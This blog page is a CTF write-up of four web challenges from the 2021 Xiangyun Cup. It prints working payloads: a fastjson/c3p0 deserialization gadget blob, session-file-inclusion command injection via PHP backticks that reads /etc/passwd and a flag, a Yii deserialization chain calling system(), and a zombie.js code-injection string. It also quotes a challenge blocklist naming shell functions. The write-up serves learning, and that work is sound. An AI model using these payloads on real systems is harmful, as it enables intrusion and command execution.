@@ -1,0 +1,1666 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2021年第二届祥云杯Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2021年第二届祥云杯Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="比赛详情
+队伍名：人类高质量男性群体
+排名：26
+
+Web (ak)
+web1 层层穿透
+
+打开环境是 Apache Flink Dashboard
+这个系统有过上传恶意 jar 包 RCE 的漏洞，github 上有现成的 RCE 工具 ..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2021年第二届祥云杯Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-25
+              </span>
+              <span>
+                50 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="比赛详情">比赛详情</h1>
+<p>队伍名：人类高质量男性群体</p>
+<p>排名：26</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d9723d8157334.png" alt="1" loading="lazy"></figure>
+<h1 id="web-ak">Web (ak)</h1>
+<h2 id="web1-层层穿透">web1 层层穿透</h2>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/2a14fc37879eb.png" alt="2" loading="lazy"></figure>
+<p>打开环境是 Apache Flink Dashboard</p>
+<p>这个系统有过上传恶意 jar 包 RCE 的漏洞，github 上有现成的 RCE 工具 ，工具可以直接反弹 shell</p>
+<p><code>https://github.com/LandGrey/flink-unauth-rce</code></p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/c79f0d1c8f971.png" alt="3" loading="lazy"></figure>
+<p>题目提示本机内网环境 10.10.1.12，最后信息搜集得到 flag 靶机位置为 10.10.1.11,8080 端口开放之后用 frp 工具搭建端口转发设置客户端，所有配置在本地配置好后上传到服务器</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/9d0463580ce2f.png" alt="4" loading="lazy"></figure>
+<p>现在自己的 服务器 上开发服务器端，再用 wget 在题目靶机的./tmp 目录下下载客户端，解压执行./frpc –c ./frpc.ini，转发成功。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/8b389e597b67a.png" alt="5" loading="lazy"></figure>
+<p>访问 服务器 设置的端口，我这里为 ip:8085。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/58802ee789534.png" alt="6" loading="lazy"></figure>
+<p>对附件 web.jar 用 jd-gui 进行反编译拿到内网 web 环境源码</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/48d395b74024a.png" alt="6" loading="lazy"></figure>
+<p>在这里看到 fastjson 反序列化，并且有一些过滤</p>
+<p>Github 上有现成的 payload</p>
+<p><code>https://github.com/depycode/fastjson-c3p0</code></p>
+<p>先登录，源码出找到账号密码 admin 123456</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/4d4706f0cb3b7.png" alt="7" loading="lazy"></figure>
+<p>看控制器登陆逻辑，直接在/doLogin 页面 post username=admin&amp;password=123456 即可之后在 admin/test 页面 post payload，改 content-type 为 json</p>
+<p><strong>Payload:</strong></p>
+<pre><code>{&quot;e&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSour ce&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAs String&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859
+596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6 E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746
+F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666
+F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E667 56E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B0005694172677 37400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A61766
+12F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436 C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2
+E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C647
+8703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017 372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E7
+47261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657
+249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C617 37371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6
+A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767D
+B37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0 A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A0 00400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720 A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800
+B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C0
+08D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010 001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A61766
+12F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A6
+17661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284 C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C6
+96E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5
+661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436 F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626 A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6
+176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696
+F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F010005646
+57074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194
+C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A61766 12F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4
+563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F4861736853657
+40C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736 572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636 D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60
+100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F6 87474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696
+F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD0
+1000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7 574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C0
+0BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C
+80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616 C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742
+F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E6
+72F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F546872656 1643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616 E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436 C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6
+176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537
+472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4 D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010
+039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A617
+6612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706 572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B2
+84C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294
+C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A6 7657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B010004657865630100282 85B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6 176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F6
+96F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000
+C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F75746
+96C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E74577269746572010007707 2696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744
+465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643
+B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672 F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A010 00D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696
+E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB0 05F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B00000
+0040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30
+006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D0 01900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC60
+00DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E0
+01000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A004800010 03E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70
+051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B
+6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B2000 3C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C0 41220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B 60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007
+A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002
+C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004 000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A000
+40049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000
+B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000 001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B
+6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081
+908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9 A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E0053002 4005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007
+B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E005600550056000
+60000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005
+AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D000
+00002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A 4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B0
+20000787000000000787871007E000D78;&quot;}}
+</code></pre>
+<p>打入之后提示长度太短，看源码长度必须超过 20000</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/0d4067c122e50.png" alt="8" loading="lazy"></figure>
+<p>将 payload 复制两边重新打入</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/730e42f12f915.png" alt="9" loading="lazy"></figure>
+<p>成功命令执行 看到 flag 就在当前目录 直接 cat 拿到 flag。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/9ef87b66cc781.png" alt="10" loading="lazy"></figure>
+<p>Flag: flag{966fc4a2-e291-4136-84be-5bfd19b949e2}</p>
+<h2 id="web2-安全检测">web2 安全检测</h2>
+<p>输入任意账号密码登录</p>
+<figure data-type="image" tabindex="12"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/9ed48da2fe635.png" alt="1" loading="lazy"></figure>
+<p>这里输入任意网站 先试试 <code>http://www.baidu.com/</code>点击确认成功之后可以预览，点击预览</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/ae20c10bb6585.png" alt="2" loading="lazy"></figure>
+<p>预览了百度的页面，猜测 ssrf 输入 <code>http://127.0.0.1/</code></p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/9333881fe7044.png" alt="3" loading="lazy"></figure>
+<p>成功预览 存在 ssrf，利用 ssrf 可以绕过 403 报错进行扫路径。扫到了 admin/include123.php,利用 ssrf 访问试试。</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/6497f7e70215f.png" alt="4" loading="lazy"></figure>
+<p>看到源码 并且存在任意文件包含</p>
+<pre><code class="language-php">&lt;?php  
+$u=$_GET['u'];  
+ 
+$pattern = &quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;;  
+$pattern .= &quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;;  
+$pattern .=&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_stat us|popen|ini_alter|ini_restore&quot;;  
+$pattern .=&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_e xec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;;  
+$pattern .=&quot;|file|dict|gopher&quot;;  
+//累了累了，饮茶先  
+ 
+$vpattern = explode(&quot;|&quot;,$pattern);  
+ 
+foreach($vpattern as $value){          if (preg_match( &quot;/$value/i&quot;, $u )){  
+        echo &quot;检测到恶意字符&quot;;  
+        exit(0);  
+    }  
+}  
+ 
+include($u); 
+show_source(__FILE__);  
+?&gt;
+</code></pre>
+<p>Get 参数 u 即可包含文件，但是过滤很严格，无法直接读到 flag，尝试/etc/passwd</p>
+<p><code>http://127.0.0.1/admin/include123.php?u=/etc/passwd</code></p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/e6216afb7de6d.png" alt="5" loading="lazy"></figure>
+<p>成功包含。考虑 session 文件包含，我们先从浏览器找到自己的 PHPSESSID</p>
+<figure data-type="image" tabindex="17"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/d110e2d1ea32f.png" alt="6" loading="lazy"></figure>
+<p>接下来包含这个文件，猜测默认目录， /tmp/sess_27a601c8ce5f70d444fc064c58a09f2b</p>
+<pre><code>http://127.0.0.1/admin/include123.php?u=/tmp/sess_27a601c8ce5f70d444fc064c58a09f2b
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/282962248311b.png" alt="7" loading="lazy"></figure>
+<p>成功包含 为了写入恶意 payload 我们随便 get 一个参数 我这里用 payload</p>
+<pre><code>http://127.0.0.1/admin/include123.php?u=/tmp/sess_27a601c8ce5f70d444fc064c58a09f2b&amp;payload=&lt;?=`whoa
+mi`;?&gt;
+</code></pre>
+<p>这里有个小疑问，源码里过滤了反引号`但实际上有可以使用看看结果</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/40afee41e61bc.png" alt="8" loading="lazy"></figure>
+<p>成功命令执行</p>
+<pre><code>http://127.0.0.1/admin/include123.php?u=/tmp/sess_27a601c8ce5f70d444fc064c58a09f2b&amp;payload=&lt;?=`ls\t/`;?&gt;
+</code></pre>
+<p>因为空格会导致崩溃 这里用\t 绕过</p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/00e34aeb33fa4.png" alt="9" loading="lazy"></figure>
+<p>看到 flag 在根目录的 getflag.sh 下，flag 关键字被过滤了 *和/*通配符也被过滤，但是问号没有过滤，所以直接传入</p>
+<pre><code>`http://127.0.0.1/admin/include123.php?u=/tmp/sess_27a601c8ce5f70d444fc064c58a09f2b&amp;payload=&lt;?=`cat\t/
+get???????`;?&gt;
+</code></pre>
+<p>用问号代替文件名字符</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/5daa5ec2fe2a9.png" alt="9" loading="lazy"></figure>
+<p>Flag: flag{c3037bbf-9b98-4ffd-9ffc-eef67138cfa9}</p>
+<h2 id="web3-ezyii">web3 ezyii</h2>
+<p>Github 上有现成的 yii 的 poc</p>
+<pre><code class="language-php">&lt;?php 
+namespace Codeception\Extension{     use Faker\DefaultGenerator;     use GuzzleHttp\Psr7\AppendStream;     class  RunProcess{         protected $output;         private $processes = [];         public function __construct(){ 
+            $this-&gt;processes[]=new DefaultGenerator(new AppendStream()); 
+            $this-&gt;output=new DefaultGenerator('jiang'); 
+        }     } 
+    echo base64_encode(serialize(new RunProcess())); 
+} 
+ 
+namespace Faker{     class DefaultGenerator 
+    { 
+        protected $default; 
+ 
+        public function __construct($default = null) 
+        { 
+            $this-&gt;default = $default; 
+        } 
+    } 
+} 
+namespace GuzzleHttp\Psr7{     use Faker\DefaultGenerator;     final class AppendStream{         private $streams = [];         private $seekable = true;         public function __construct(){ 
+            $this-&gt;streams[]=new CachingStream(); 
+        }     } 
+    final class CachingStream{         private $remoteStream;         public function __construct(){ 
+            $this-&gt;remoteStream=new DefaultGenerator(false); 
+            $this-&gt;stream=new  PumpStream(); 
+        }     } 
+    final class PumpStream{         private $source;         private $size=-10;         private $buffer; 
+        public function __construct(){ 
+            $this-&gt;buffer=new DefaultGenerator('j');             include(&quot;closure/autoload.php&quot;);             $a = function(){system('ls /');}; 
+            $a = \Opis\Closure\serialize($a); 
+            $b = unserialize($a); 
+            $this-&gt;source=$b; 
+        } 
+    } 
+}
+</code></pre>
+<p><strong>Payload：</strong></p>
+<p><code>TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtlclxEZWZhd Wx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjU6ImppYW5nIjt9czo0MzoiAENvZGVjZXB0aW9uXEV4dGVuc2lvbl xSdW5Qcm9jZXNzAHByb2Nlc3NlcyI7YToxOntpOjA7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZ GVmYXVsdCI7TzoyODoiR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbSI6Mjp7czozNzoiAEd1enpsZUh0dHBcUHNyN1xBcH BlbmRTdHJlYW0Ac3RyZWFtcyI7YToxOntpOjA7TzoyOToiR3V6emxlSHR0cFxQc3I3XENhY2hpbmdTdHJlYW0iOjI6e3M6NDM6I gBHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbQByZW1vdGVTdHJlYW0iO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3I iOjE6e3M6MTA6IgAqAGRlZmF1bHQiO2I6MDt9czo2OiJzdHJlYW0iO086MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFt IjozOntzOjM0OiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac291cmNlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphY mxlQ2xvc3VyZSI6MTgzOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjI4OiJmdW5jdGlvbigpe1xzeXN0ZW0 oJ2xzIC8nKTt9IjtzOjU6InNjb3BlIjtzOjI2OiJHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbSI7czo0OiJ0aGlzIjtOO3M6NDoic2VsZiI7 czozMjoiMDAwMDAwMDAyNDczOTc2YzAwMDAwMDAwMzQyYjBhMDIiO319czozMjoiAEd1enpsZUh0dHBcUHNyN1xQdW1 wU3RyZWFtAHNpemUiO2k6LTEwO3M6MzQ6IgBHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbQBidWZmZXIiO086MjI6IkZha2 VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6MToiaiI7fX19fXM6Mzg6IgBHdXp6bGVIdHRwXFB zcjdcQXBwZW5kU3RyZWFtAHNlZWthYmxlIjtiOjE7fX19fQ==</code></p>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/4410346a6b251.png" alt="1" loading="lazy"></figure>
+<p>然后把这个命令</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/708ec7e15d9e3.png" alt="2" loading="lazy"></figure>
+<p>改为 system('cat /flag.txt')</p>
+<p><strong>Payload：</strong></p>
+<pre><code>TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtl clxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjU6ImppYW5nIjt9czo0MzoiAENvZGVjZXB0 aW9uXEV4dGVuc2lvblxSdW5Qcm9jZXNzAHByb2Nlc3NlcyI7YToxOntpOjA7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbm VyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7TzoyODoiR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbSI6Mjp
+7czozNzoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac3RyZWFtcyI7YToxOntpOjA7TzoyOToiR3V6emxlS
+HR0cFxQc3I3XENhY2hpbmdTdHJlYW0iOjI6e3M6NDM6IgBHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbQByZ
+W1vdGVTdHJlYW0iO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO2I6M
+Dt9czo2OiJzdHJlYW0iO086MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjozOntzOjM0OiIAR3V6emxlSHR 0cFxQc3I3XFB1bXBTdHJlYW0Ac291cmNlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphYmxlQ2xvc3VyZSI6MT kyOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjM3OiJmdW5jdGlvbigpe1xzeXN0ZW0oJ2Nhd CAvZmxhZy50eHQnKTt9IjtzOjU6InNjb3BlIjtzOjI2OiJHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbSI7czo0OiJ0aGlzIj tOO3M6NDoic2VsZiI7czozMjoiMDAwMDAwMDAyZTMxMDZmZDAwMDAwMDAwMTNlYjQzZDkiO319czozMjoi AEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAHNpemUiO2k6LTEwO3M6MzQ6IgBHdXp6bGVIdHRwXFBzcjd cUHVtcFN0cmVhbQBidWZmZXIiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF 1bHQiO3M6MToiaiI7fX19fXM6Mzg6IgBHdXp6bGVIdHRwXFBzcjdcQXBwZW5kU3RyZWFtAHNlZWthYmxlIjtiOjE7f X19fQ==
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/6686f3e572d82.png" alt="3" loading="lazy"></figure>
+<h2 id="web4-crawer_z">web4 crawer_z</h2>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/267339382511d.png" alt="1" loading="lazy"></figure>
+<p>先注册账号登录看看源码</p>
+<figure data-type="image" tabindex="26"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/3d7c5ba797c4f.png" alt="2" loading="lazy"></figure>
+<p>看到引用了 zombie 框架，谷歌一下漏洞找到了这篇</p>
+<p><code>https://ha.cker.in/index.php/Article/13563</code></p>
+<figure data-type="image" tabindex="27"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/fcdf768dcc384.png" alt="3" loading="lazy"></figure>
+<p>看看漏洞描述</p>
+<figure data-type="image" tabindex="28"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/721ff6df63538.png" alt="4" loading="lazy"></figure>
+<p>攻击者可以在他们的页面中插入 JS 代码来利用 zombiejs 代码注入漏洞。如果使用 zombiejs 抓取此类页面，则运行爬虫的机器将运行攻击者提供的任意命令。为了比较，jsdom 默认禁用脚本执行。</p>
+<p>也就是说我们可以让靶机访问我们自定义的恶意页面即可进行代码执行。下面有现场的 payload，我们先把 payload 提取一下</p>
+<pre><code>var codeToExec = &quot;var sync=require('child_process').spawnSync; &quot; + 
+    &quot;var ls = sync('cat', ['./resources/test.html']); console.log(ls.output.toString());
+&quot;; 
+var exploit = &quot;c='constructor';require=this[c][c]('return process')().mainModule.requir e;&quot; + codeToExec; 
+var attackVector = &quot;c='constructor';this[c][c](\&quot;&quot; + exploit + &quot;\&quot;)()&quot;; console.log(attackVector)
+</code></pre>
+<p>本地控制台输出得到的 <strong>payload:</strong></p>
+<p><code>c='constructor';this[c][c](&quot;c='constructor';require=this[c][c]('return 	process')().mainModule.require;var sync=require('child_process').spawnSync; 	var 	ls 	= 	sync('cat', 	['./resources/test.html']); console.log(ls.output.toString());&quot;)()</code></p>
+<p>更改一下命令为反弹 shell 命令</p>
